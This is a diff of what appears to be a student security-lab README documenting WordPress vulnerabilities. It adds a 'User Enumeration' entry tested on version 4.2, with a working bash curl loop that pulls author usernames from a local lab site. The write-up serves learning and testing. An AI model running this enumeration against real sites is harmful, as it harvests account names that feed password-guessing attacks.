@@ -36,15 +36,16 @@ Time spent: Approximately 4 hours.
     I could not find affected source code, but there is amplifying information found at:  
     [Link 1] (https://packetstormsecurity.com/files/131644/)
     
-1. (Required) Vulnerability Name or ID
+1. WordPress User Enumeration
   - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
+    - Vulnerability types: User Enumeration
+    - Tested in version: 4.2
+    - Fixed in version: Unsure.I could not get it to work in version 4.9.
   - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+  - [ ] Steps to recreate:  This one is as simple as running a bash script and pasting the target WordPress site into it.  The script is: for i in {1..10}; do curl -s -L -i http://wpdistillery.vm?author=$i | grep -E -o "\" title=\"View all posts by [a-z0-9A-Z\-\.]*|Location:.*" | sed 's/\// /g' | cut -f 6 -d ' ' | grep -v "^$"; done
+  
+  - [ ] Affected source code:  
+    - Unsure, but there is amplifying information about this attack at: https://hackertarget.com/wordpress-user-enumeration
 1. (Optional) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
